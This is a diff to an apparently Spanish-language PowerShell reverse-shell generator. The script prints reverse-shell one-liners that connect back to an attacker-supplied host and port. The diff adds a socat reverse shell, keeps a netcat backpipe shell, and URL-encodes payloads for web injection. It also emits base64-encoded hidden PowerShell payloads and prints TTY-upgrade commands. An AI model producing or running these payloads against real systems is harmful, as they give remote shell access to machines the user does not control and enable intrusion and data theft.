@@ -1,9 +1,7 @@
-﻿param(
-[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit,[switch]$PowershellICMP,[switch]$PowershellTCP,[switch]$PowershellUDP
+param(
+[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$socat,[switch]$metasploit,[switch]$PowershellICMP,[switch]$PowershellTCP,[switch]$PowershellUDP
 
 )
-
-
 
 
 $metasploit_perl = @"
@@ -240,7 +238,12 @@ break
 
 }
 
-if ($netcat -eq $false -and $python -eq $false -and $python3 -eq $false -and $bash -eq $false -and $perl -eq $false -and $php -eq $false -and $ruby -eq $false -and $java -eq $false -and $PowershellICMP -eq $false -and $PowershellTCP -eq $false -and $PowershellUDP -eq $false) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Debes seleccionar el lenguaje de la shell `n`n" -ForegroundColor red; break }
+if ($netcat -eq $false -and $python -eq $false -and $python3 -eq $false -and $bash -eq $false -and $perl -eq $false -and $php -eq $false -and $ruby -eq $false -and $java -eq $false -and $PowershellICMP -eq $false -and $PowershellTCP -eq $false -and $PowershellUDP -eq $false -and $socat -eq $false) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Debes seleccionar el lenguaje de la shell `n`n" -ForegroundColor red; break }
+
+$r_socat = @"
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$Lhost`:$Lport
+"@
+
 
 $r_netcat = @"
 mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc $Lhost $Lport 1>/tmp/backpipe
@@ -287,31 +290,33 @@ $script = $script -replace "powershell.exe -c","" -replace '"',""
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 write-host "powershell.exe+-win+hidden+-enc+$EncodedText"
-#$EncodedText = "powershell.exe+-win+hidden+-enc+" + $EncodedText
-#write-host $EncodedText
 #########################################################################################################################
 }
+
+function encodedurl {param($script)
+$script -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" -replace "\(","&#40" -replace "\)","&#41";$total = $script.Length - 3; $script = $script.Substring(0,$total)
+
+}
+
 
 if ($web -eq $true) {
 
 Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell reversa es : `n`n" -ForegroundColor Green 
-$r_net
+#$r_net
 
-if ($python3 -eq $true) {$r_python = $r_python -replace "python","python3" -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ;$total = $r_python.Length - 3; $r_python = $r_python.Substring(0,$total); write-host "$r_python `n" }
-if ($python -eq $true) {$r_python = $r_python -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_python.Length - 3; $r_python = $r_python.Substring(0,$total) ; write-host "$r_python `n" }
-if ($bash -eq $true) {$r_bash = $r_bash  -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_bash.Length -3; $r_bash = $r_bash.Substring(0,$total); write-host "$r_bash `n" }
-if ($perl -eq $true) {$r_perl = $r_perl -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_perl.Length -3 ; $r_perl = $r_perl.Substring(0,$total) ;write-host "$r_perl `n"}
-if ($php -eq $true) {$r_php = $r_php -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_php.Length -3 ;$r_php = $r_php.Substring(0,$total); write-host "$r_php `n"}
-if ($ruby -eq $true) {$r_ruby =  $r_ruby -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_ruby.Length -3; $r_ruby = $r_ruby.Substring(0,$total); write-host "$r_ruby `n"}
-if ($java -eq $true) {$r_java = $r_java-replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_java.Length -3; $r_java = $r_java.Substring(0,$total); write-host "$r_java `n"}
-if ($xterm -eq $true) {$r_xterm = $r_xterm -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_xterm.Length -3 ; $r_xterm = $r_xterm.Substring(0,$total); write-host "$r_xterm `n"}
-if ($netcat -eq $true) {$r_netcat = $r_netcat -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_netcat.Length -3 ; $r_netcat = $r_netcat.Substring(0,$total);write-host "$r_netcat `n"}
-#if ($PowershellICMP -eq $true) {$r_PowershellICMP = $r_PowershellICMP -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_PowershellICMP.Length -3 ; $r_PowershellICMP = $r_PowershellICMP.Substring(0,$total);write-host "$r_PowershellICMP `n"}
-#if ($PowershellTCP -eq $true) {$r_PowershellTCP = $r_PowershellTCP -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_PowershellTCP.Length -3 ; $r_PowershellTCP = $r_PowershellTCP.Substring(0,$total);write-host "$r_PowershellTCP `n"}
-#if ($PowershellUDP -eq $true) {$r_PowershellUDP = $r_PowershellUDP -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_PowershellUDP.Length -3 ; $r_PowershellUDP = $r_PowershellUDP.Substring(0,$total);write-host "$r_PowershellUDP `n"}
-if ($PowerShellICMP -eq $true) {$r_PowershellICMP = encodebase64 -script $r_PowershellICMP}
-if ($PowerShellTCP -eq $true ) {$r_PowershellTCP = encodebase64 -script $r_PowershellTCP}
-if ($PowerShellUDP -eq $true) {$r_PowershellUDP = encodebase64 -script $r_PowershellUDP}
+if ($python3 -eq $true) {$r_python = encodedurl -script $r_python; $r_python = $r_python -replace "python","python3"; write-host "$r_python `n" }
+if ($python -eq $true) {$r_python = encodedurl -script $r_python; write-host "$r_python `n" }
+if ($bash -eq $true) {$r_bash = encodedurl -script $r_bash;write-host "$r_bash `n" }
+if ($perl -eq $true) {$r_perl = encodedurl -script $r_perl ;write-host "$r_perl `n"}
+if ($php -eq $true) {$r_php = encodedurl -script $r_php ;write-host "$r_php `n"}
+if ($ruby -eq $true) {$r_ruby = encodedurl -script $r_ruby ;write-host "$r_ruby `n"}
+if ($java -eq $true) {$r_java = encodedurl -script $r_java ;write-host "$r_java `n"}
+if ($xterm -eq $true) {$r_xterm = encodedurl -script $r_xterm ;write-host "$r_xterm `n"}
+if ($netcat -eq $true) {$r_netcat = encodedurl -script $r_netcat ;write-host "$r_netcat `n"}
+if ($socat -eq $true) {$r_socat = encodedurl -script $r_socat ; Write-Host "$r_socat `n"}
+if ($PowerShellICMP -eq $true) {encodebase64 -script $r_PowershellICMP; Write-Host "`n" ; Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell urlencoded : `n`n" -ForegroundColor Green ; encodedurl -script $r_PowershellICMP }
+if ($PowerShellTCP -eq $true ) {encodebase64 -script $r_PowershellTCP; Write-Host "`n"; Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell urlencoded : `n`n" -ForegroundColor Green;   encodedurl -script $r_PowershellTCP}
+if ($PowerShellUDP -eq $true) {encodebase64 -script $r_PowershellUDP; Write-Host "`n"; Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell urlencoded : `n`n" -ForegroundColor Green;  encodedurl -script $r_PowershellUDP}
 
 ################################################################################ Spawn tty shell ################################################################################
 
@@ -353,18 +358,19 @@ if ($php -eq $true) {write-host $r_php  "`n"}
 if ($ruby -eq $true) {write-host $r_ruby "`n"}
 if ($java -eq $true) {write-host $r_java "`n"}
 if ($xterm -eq $true) {write-host $r_xterm "`n"}
+if ($socat -eq $true) {$r_socat = Write-Host "$r_socat `n"}
 if ($PowershellICMP -eq $true) {write-host $r_PowershellICMP "`n"}
 if ($PowershellTCP -eq $true) {write-host $r_PowershellTCP "`n"}
 if ($PowershellUDP -eq $true) {write-host $r_PowershellUDP "`n"}
 
 ################################################################################ Spawn tty shell ################################################################################
 
-if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/sh`")'" }
-if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
+if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/bash`")'" }
+if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/bash`")'" }
 if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
-if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
-if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }
-
+if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/bash`";'" }
+if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/bash`"" }
+if ($socat -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/bash`")'" }
 
 ################################################################################ Metasploit ################################################################################
 
@@ -381,4 +387,3 @@ if ($PowershellTCP -eq $true -and $metasploit -eq $true) {Write-Host "[" -Foregr
 if ($Powershelludp -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellUDP (proximas updates...)`n" }
 
 }
-
